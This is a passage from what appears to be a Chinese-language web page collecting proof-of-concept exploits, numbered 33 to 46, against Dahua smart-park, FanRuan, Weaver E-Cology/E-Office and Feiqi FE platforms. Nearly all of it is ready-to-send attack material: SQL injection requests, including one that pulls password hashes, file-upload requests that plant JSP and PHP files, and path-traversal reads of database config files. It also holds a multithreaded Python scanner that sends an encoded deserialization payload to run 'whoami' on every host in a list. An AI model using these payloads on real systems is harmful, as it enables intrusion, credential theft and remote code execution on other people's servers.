</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_33-大华智慧园区任意密码读取攻击"><a href="#_33-大华智慧园区任意密码读取攻击" class="header-anchor">#</a> 33.大华智慧园区任意密码读取攻击</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>GET /admin/user_getUserInfoByUserName.action?userName=system
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_34-大华智慧园区综合管理平台-searchjson-sql注入漏洞"><a href="#_34-大华智慧园区综合管理平台-searchjson-sql注入漏洞" class="header-anchor">#</a> 34.大华智慧园区综合管理平台 searchJson SQL注入漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(388609)),0x7e),1)--%22%7D/extend/%7B%7D HTTP/1.1
Host: 127.0.0.1:7443
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h2 id="_35-大华智慧园区综合管理平台-文件上传漏洞"><a href="#_35-大华智慧园区综合管理平台-文件上传漏洞" class="header-anchor">#</a> 35.大华智慧园区综合管理平台 文件上传漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /publishing/publishing/material/file/video HTTP/1.1
Host: 127.0.0.1:7443
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 804
Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7
Accept-Encoding: gzip, deflate
Connection: close

--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name=&quot;Filedata&quot;; filename=&quot;0EaE10E7dF5F10C2.jsp&quot;

&lt;%@page contentType=&quot;text/html; charset=GBK&quot;%&gt;&lt;%@page import=&quot;java.math.BigInteger&quot;%&gt;&lt;%@page import=&quot;java.security.MessageDigest&quot;%&gt;&lt;% MessageDigest md5 = null;md5 = MessageDigest.getInstance(&quot;MD5&quot;);String s = &quot;123456&quot;;String miyao = &quot;&quot;;String jiamichuan = s + miyao;md5.update(jiamichuan.getBytes());String md5String = new BigInteger(1, md5.digest()).toString(16);out.println(md5String);new java.io.File(application.getRealPath(request.getServletPath())).delete();%&gt;
--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name=&quot;poc&quot;

poc
--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name=&quot;Submit&quot;

submit
--dd8f988919484abab3816881c55272a7--
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><h2 id="_36-帆软channel序列化"><a href="#_36-帆软channel序列化" class="header-anchor">#</a> 36.帆软channel序列化</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>#!/usr/bin/env python
# -*- conding:utf-8 -*-
# 帆软channel接口反序列化
# Author: SXdysq

import base64
import requests
import urllib3
import concurrent.futures

urllib3.disable_warnings()

headers = {
    &quot;Pragma&quot;: &quot;no-cache&quot;,
    &quot;Cache-Control&quot;: &quot;no-cache&quot;,
    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&quot;,
    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;,
    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;,
    &quot;Connection&quot;: &quot;close&quot;,
}

def check(host):
    try:
        burp0_url = host + &quot;/webroot/decision/remote/design/channel&quot;
        req = requests.get(burp0_url, headers=headers, verify=False, timeout=3)
        if &quot;method 'GET' not supported&quot; in req.text:
            req = requests.post(burp0_url, headers=headers, verify=False, timeout=3)
            if &quot;如需访问请联系管理员&quot; not in req.text:
                cmd(host)
            else:
                print(&quot;[o]&quot;, host, &quot;------不存在漏洞！&quot;)
        else:
            print(&quot;[o]&quot;, host, &quot;------不存在漏洞！&quot;)
    except Exception as e:
        print(&quot;[o]&quot;, host, &quot;------不存在漏洞！&quot;)

def cmd(host):
    try:
        burp0_url = host + &quot;/webroot/decision/remote/design/channel&quot;
        burp0_headers = {&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Testdmc&quot;: &quot;whoami&quot;, &quot;Testecho&quot;: &quot;TestEcho&quot;}
        b = b&quot;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&quot;
        burp0_data = base64.b64decode(b)
        res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False, timeout=3)

        if res.status_code == 200 and 'Testdmc' in res.headers and res.headers['Testdmc']:
            testdmc_value = res.headers['Testdmc']
            print(&quot;[+]&quot;, host, &quot;------存在漏洞！&quot;)
            print(&quot;Testdmc的值为：&quot;, base64.b64decode(testdmc_value).decode('utf-8'))
        else:
            print(&quot;[o]&quot;, host, &quot;------不存在漏洞！&quot;)
    except Exception as e:
        print(&quot;[o]&quot;, host, &quot;------不存在漏洞！&quot;)

if __name__ == '__main__':
    with open('urls.txt', 'r') as file:
        hosts = [line.strip() for line in file]

    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.map(check, hosts)
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br></div></div><h2 id="_37-泛微-e-cology-某版本-sql注入漏洞-poc"><a href="#_37-泛微-e-cology-某版本-sql注入漏洞-poc" class="header-anchor">#</a> 37.泛微 E-Cology 某版本 SQL注入漏洞 POC</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1
Host: ip:port 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
Connection: close
Content-Length: 189
Content-Type: text/plain
Accept-Encoding: gzip

callCount=1
page=
httpSessionId=
scriptSessionId=
c0-scriptName=DocDwrUtil
c0-methodName=ifNewsCheckOutByCurrentUser
c0-id=0
c0-param0=string:1 AND 1=1
c0-param1=string:1
batchId=0
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h2 id="_38-泛微-hrmcareerapplyperview-sql注入漏洞"><a href="#_38-泛微-hrmcareerapplyperview-sql注入漏洞" class="header-anchor">#</a> 38.泛微 HrmCareerApplyPerView SQL注入漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>GET
/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(db_name()),db_name(1),5,6,7 HTTP/1.1
Host: 127.0.0.1:7443
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)
Accept-Encoding: gzip, deflate
Connection: close
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h2 id="_39-泛微-showdocsimagesql注入漏洞"><a href="#_39-泛微-showdocsimagesql注入漏洞" class="header-anchor">#</a> 39.泛微 ShowDocsImagesql注入漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>GET
/weaver/weaver.docs.docs.ShowDocsImageServlet?docId=* HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,
like Gecko) 5bGx5rW35LmL5YWz
Accept-Encoding: gzip, deflate
Connection: close
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h2 id="_40-泛微-weaver-e-office9-前台文件包含"><a href="#_40-泛微-weaver-e-office9-前台文件包含" class="header-anchor">#</a> 40.泛微 Weaver E-Office9 前台文件包含</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>http://URL/E-mobile/App/Init.php?weiApi=1&amp;sessionkey=ee651bec023d0db0c233fcb562ec7673_admin&amp;m=12344554_../../attachment/xxx.xls
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_41-泛微9存在sql注入"><a href="#_41-泛微9存在sql注入" class="header-anchor">#</a> 41.泛微9存在sql注入</h2> <p><strong>影响版本</strong></p> <div class="language- line-numbers-mode"><pre class="language-text"><code>(1)/E-mobile/flowdo_page.php?diff=delete&amp;RUN_ID=1  //参数RUN_ID
(2)/E-mobile/flowdo_page.php?diff=delete&amp;flowid=1  //参数flowid
(3)/E-mobile/flowsorce_page.php?flowid=2
(4)/E-mobile/flownext_page.php?diff=candeal&amp;detailid=2
(5)/E-mobile/flowimage_page.php?FLOW_ID=2
(6)/E-mobile/flowform_page.php?FLOW_ID=2
(7)/E-mobile/diaryother_page.php?searchword=23
(8)/E-mobile/create/ajax_do.php?diff=word&amp;sortid=1       //参数sortid
(9)/E-mobile/create/ajax_do.php?diff=word&amp;idstr=2       //参数idstr
(10)/E-mobile/flow/freeflowimg.php?RUN_ID=1             
(11)/E-mobile/create/ajax_do.php?diff=addr&amp;sortid=1     //参数sortid
(12)/E-mobile/create/ajax_do.php?diff=addr&amp;userdept=1  //参数userdept
(13)/E-mobile/create/ajax_do.php?diff=addr&amp;userpriv=1 //参数userpriv
(14)/E-mobile/create/ajax_do.php?diff=wordsearch&amp;idstr=1  //参数idstr
(15)/E-mobile/flow/flowhave_page.php?detailid=2,3
(16)/E-mobile/flow/flowtype_free.php?flowid=1
(17)/E-mobile/flow/flowtype_free.php?runid=1
(18)/E-mobile/flow/flowtype_other.php?flowid=1
(19)/E-mobile/flow/flowtype_other.php?runid=1
(20)/E-mobile/flow/freeflowimage_page.php?fromid=2
(21)/E-mobile/flow/freeflowimage_page.php?diff=new&amp;runid=2  //参数runid

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><h2 id="_42-泛微ecology-oa-前台任意sql语句执行"><a href="#_42-泛微ecology-oa-前台任意sql语句执行" class="header-anchor">#</a> 42.泛微Ecology OA 前台任意SQL语句执行</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>  Condition: body=&quot;/js/ecology8&quot; || body=&quot;wui/common/css/w7OVFont_wev8.css&quot; || (body=&quot;weaver&quot;
    &amp;amp;&amp;amp; body=&quot;ecology&quot;) || (header=&quot;ecology_JSessionId&quot; &amp;amp;&amp;amp; body=&quot;login/Login.jsp&quot;)
    || body=&quot;/wui/index.html&quot; || body=&quot;jquery_wev8&quot;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><div class="language- line-numbers-mode"><pre class="language-text"><code>  relative: req0
  session: false
  requests:
  - method: GET
    timeout: 10
    path: /upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like
        Gecko) Chrome/62.0.2426.8 Safari/537.36
    follow_redirects: true
    matches: (code.eq(&quot;200&quot;) &amp;amp;&amp;amp; body.regex(&quot;[0-9A-F]{32}&quot;))
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h2 id="_43-泛微ecology未授权"><a href="#_43-泛微ecology未授权" class="header-anchor">#</a> 43.泛微Ecology未授权</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /OfficeServer HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymVk33liI64J7GQaK
Content-Length: 204

------WebKitFormBoundarymVk33liI64J7GQaK
Content-Disposition: form-data; name=&quot;aaa&quot;

{'OPTION':'INSERTIMAGE','isInsertImageNew':'1','imagefileid4pic':'100'}
------WebKitFormBoundarymVk33liI64J7GQaK—
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h2 id="_44-泛微e-office9文件上传漏洞"><a href="#_44-泛微e-office9文件上传漏洞" class="header-anchor">#</a> 44. 泛微E-Office9文件上传漏洞</h2> <p>CVE-2023-2648</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
Host: 192.168.233.10:8082
User-Agent: test
Connection: close
Content-Length: 493
Accept-Encoding: gzip
Content-Type: multipart/form-data

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name=&quot;Filedata&quot;; filename=&quot;666.php&quot;
Content-Type: application/octet-stream

&lt;?php phpinfo();?&gt;

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p><strong>CVE-2023-2523</strong></p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /Emobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1 
Host:192.168.233.10:8082  
Cache-Control:max-age=0  
Upgrade-Insecure-Requests:1  
Origin:null  
Content-Type:multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt  
Accept-Encoding:gzip, deflate
Accept-Language:en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection:close

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition:form-data; name=&quot;upload_quwan&quot;; filename=&quot;1.php.&quot;
Content-Type:image/jpeg
&lt;?phpphpinfo();?&gt;
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><h2 id="_45-泛微oa代码执行"><a href="#_45-泛微oa代码执行" class="header-anchor">#</a> 45.泛微oa代码执行</h2> <p><strong>描述和影响范围</strong></p> <p>Weaver E-Office9版本存在代码问题漏洞，该漏洞源于文件/inc/jquery/uploadify/uploadify.php存在问题，对参数Filedata的操作会导致不受限制的上传。</p> <p>Weaver E-Office9.0</p> <p><strong>POC or EXP</strong></p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
Host: 192.168.232.137:8082
User-Agent: test
Connection: close
Content-Length: 493
Accept-Encoding: gzip
Content-Type: multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85

--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
Content-Disposition: form-data; name=&quot;Filedata&quot;; filename=&quot;666.php&quot;
Content-Type: application/octet-stream

&lt;?php phpinfo();?&gt;

--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--
--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;&quot;
Content-Type: application/octet-stream

--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><h2 id="_46-飞企互联-fe-业务协作平台-magepath-参数文件读取漏洞"><a href="#_46-飞企互联-fe-业务协作平台-magepath-参数文件读取漏洞" class="header-anchor">#</a> 46.飞企互联 FE 业务协作平台 magePath 参数文件读取漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&amp;print
